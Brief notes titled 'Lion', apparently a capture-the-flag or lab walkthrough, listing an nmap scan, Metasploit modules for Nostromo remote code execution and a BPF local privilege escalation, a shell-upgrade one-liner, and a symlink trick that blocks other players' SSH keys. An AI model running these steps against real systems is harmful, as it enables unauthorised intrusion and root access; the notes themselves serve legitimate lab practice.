Lion

- nmap scan for flag on random port

`msfconsole` `use exploit/multi/http/nostromo_code_exec` port 8080

`use post/multi/manage/shell_to_meterpreter`

- To prevent others from following tutorial to ssh-keygen, `mkdir .ssh`, `ln -s /dev/null .ssh/authorized_keys`

`background`

`use exploit/linux/local/bpf_sign_extension_priv_esc`

`python3 -c 'import pty; pty.spawn("/bin/bash")'` to get full shell